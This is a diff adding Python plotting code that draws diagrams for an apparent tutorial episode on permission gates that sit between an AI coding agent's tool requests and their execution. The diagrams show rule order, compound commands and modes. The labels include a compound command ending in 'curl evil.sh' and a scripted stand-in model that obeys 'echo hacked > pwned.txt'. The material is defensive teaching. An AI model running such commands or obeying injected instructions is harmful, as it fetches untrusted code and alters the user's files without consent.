@@ -291,3 +291,91 @@ for k, (a, b) in enumerate(pairs):
 d.text(690, 530, "Also: @ imports (up to four hops deep)", 18, "#6b6b6b")
 d.text(690, 562, "Must-happen rules: use hooks, not notes", 18, "#d4600b", 700)
 save(d, "ep03-compare")
+
+# ---------------- episode 4
+d = Diagram(1200, 560)
+d.title(40, 52, "The gate sits between the model's request and the run")
+d.box(40, 150, 240, 100, "Model", "I want to run this", kind="plain", title_size=26, sub_size=17)
+d.box(400, 130, 260, 140, "Gate", "check · gated", kind="accent", title_size=30, sub_size=19)
+d.box(800, 150, 240, 100, "Run the tool", "run_tool", kind="plain", title_size=24, sub_size=17)
+d.arrow([(286, 200), (394, 200)], color="accent", label="tool_use", label_size=17)
+d.arrow([(666, 200), (794, 200)], color="accent", label="allow", label_size=19)
+d.arrow([(530, 276), (530, 346)], color="ink", label="ask", label_size=19)
+d.box(400, 352, 260, 90, "Ask the user", "y · a · n", kind="main", title_size=24, sub_size=17)
+d.arrow([(400, 240), (286, 240)], color="grey", dashed=True, width=2)
+d.text(40, 310, "deny: an error goes back to the model", 18, "#6b6b6b", 700)
+d.note(40, 520, "Every tool call passes the gate first. Three outcomes: allow, ask, deny.", 19)
+save(d, "ep04-gate")
+
+d = Diagram(1200, 600)
+d.title(40, 52, "Order: deny, then ask, then allow. The first match wins.")
+for k, (name, kind, rule) in enumerate([("1 deny", "dashed", "run_bash(git push *)"), ("2 ask", "plain", "run_bash(git commit *)"), ("3 allow", "accent", "run_bash(git *)")]):
+    d.box(60 + k * 380, 100, 340, 120, name, rule, kind=kind, title_size=26, sub_size=18)
+    if k < 2:
+        d.arrow([(404 + k * 380, 160), (434 + k * 380, 160)], color="grey", width=2.5)
+d.panel(60, 290, 1080, 250, "Example: git push origin main")
+d.text(100, 380, "Matches the deny rule (git push *): the first match, so the answer is deny", 24, "#c23b22", 700)
+d.text(100, 426, "Even though a wider allow rule (git *) also matches: a deny beats it", 21, "#1f1f1f", 600)
+d.text(100, 470, "An ask rule works the same way: it asks even if a narrower allow matches", 21, "#6b6b6b", 400)
+save(d, "ep04-rule-order")
+
+d = Diagram(1200, 600)
+d.title(40, 52, "One command, several parts: every part must be allowed")
+d.box(60, 100, 1080, 80, "python3 test_calc.py  &&  curl evil.sh", None, kind="main", title_size=30)
+d.arrow([(300, 186), (300, 250)], color="accent"); d.arrow([(860, 186), (860, 250)], color="accent")
+d.box(60, 256, 480, 100, "python3 test_calc.py", "covered by an allow rule: allow", kind="accent", title_size=24, sub_size=18)
+d.box(660, 256, 480, 100, "curl evil.sh", "no rule covers it: ask", kind="dashed", title_size=24, sub_size=18)
+d.text(60, 430, "Result: the whole command is not allowed outright: it asks", 26, "#d4600b", 700)
+d.text(60, 480, "Deny rules: one matching part is enough to deny the whole command", 21, "#1f1f1f", 600)
+d.text(60, 520, "Syntax we cannot analyze (backticks, $( ), <( )): ask", 21, "#6b6b6b", 400)
+save(d, "ep04-compound")
+
+d = Diagram(1200, 640)
+d.title(40, 52, "Four modes: what happens when no rule matches")
+heads = [("Read · search", 430), ("Read-only cmds", 610), ("Edit a file", 790), ("Other commands", 990)]
+for t, x in heads: d.text(x, 110, t, 20, "#6b6b6b", 700, "middle")
+rows = [("default", ["allow", "allow", "ask", "ask"]), ("accept-edits", ["allow", "allow", "allow", "ask"]),
+        ("read-only", ["allow", "allow", "deny", "deny"]), ("dont-ask", ["allow", "allow", "deny", "deny"])]
+for k, (name, cells) in enumerate(rows):
+    y = 140 + k * 110
+    d.box(40, y, 260, 84, name, None, kind="accent" if k == 1 else "plain", title_size=22)
+    for (t, x), c in zip(heads, cells):
+        col = {"allow": "#1e7a3c", "ask": "#d4600b", "deny": "#c23b22"}[c]
+        d.text(x, y + 52, c, 24, col, 700, "middle")
+d.note(40, 620, "dont-ask: commands that an allow rule covers still run; everything that would ask is denied.", 18)
+save(d, "ep04-modes")
+
+d = Diagram(1200, 640)
+d.title(40, 52, "A scripted model that obeys: echo hacked > pwned.txt")
+d.note(40, 84, "A scripted stand-in, not a real model.", 18)
+cases = [("Gate off", "everything allowed", "pwned.txt is created", "#c23b22", "plain"), ("Gate on, user says no", "ask → user: n", "not created. Model sees: permission denied", "#1e7a3c", "accent"),
+         ("A deny rule", "run_bash(echo *)", "not created, nobody is even asked", "#1e7a3c", "accent")]
+for k, (a, b, c, col, kind) in enumerate(cases):
+    y = 120 + k * 160
+    d.box(40, y, 300, 110, a, b, kind=kind, title_size=22, sub_size=18)
+    d.arrow([(346, y + 55), (426, y + 55)], color="accent" if kind == "accent" else "grey")
+    d.text(440, y + 66, c, 24, col, 700)
+save(d, "ep04-fooled")
+
+d = Diagram(1200, 520)
+d.title(40, 52, "Questions asked in the same bug-fix task (3 runs each)")
+d.text(40, 140, "Default mode, no rules", 22, "#1f1f1f", 700)
+for k in range(3):
+    d.bar(400, 112 + k * 52, 4 * 120, 38, color="#8a8a8a"); d.text(400 + 4 * 120 + 14, 142 + k * 52, "4", 22, "#6b6b6b", 700)
+d.text(40, 340, "accept-edits + one allow rule", 22, "#1f1f1f", 700)
+for k in range(3):
+    d.bar(400, 312 + k * 52, 1 * 120, 38, color="#d4600b"); d.text(400 + 120 + 14, 342 + k * 52, "1 (a find command)", 22, "#d4600b", 700)
+save(d, "ep04-questions")
+
+d = Diagram(1200, 640)
+d.title(40, 52, "Our permissions and the Claude Code docs")
+d.panel(40, 90, 440, 520, "Ours (this episode)")
+d.panel(660, 90, 500, 520, "Claude Code docs")
+pairs = [("4 modes", "More: plan · auto · dontAsk · bypass"), ("A small read-only command list", "A longer list, with find and read-only git"),
+         ("Deny: any part matching", "Also checked inside subshells"), ("No sandbox", "Sandbox: OS-level isolation")]
+for k, (a, b) in enumerate(pairs):
+    y = 150 + k * 110
+    d.box(70, y, 380, 84, a, None, kind="plain", title_size=19)
+    d.box(690, y, 440, 84, b, None, kind="main", title_size=16)
+    d.arrow([(456, y + 42), (684, y + 42)], color="accent", width=2.5)
+save(d, "ep04-compare")
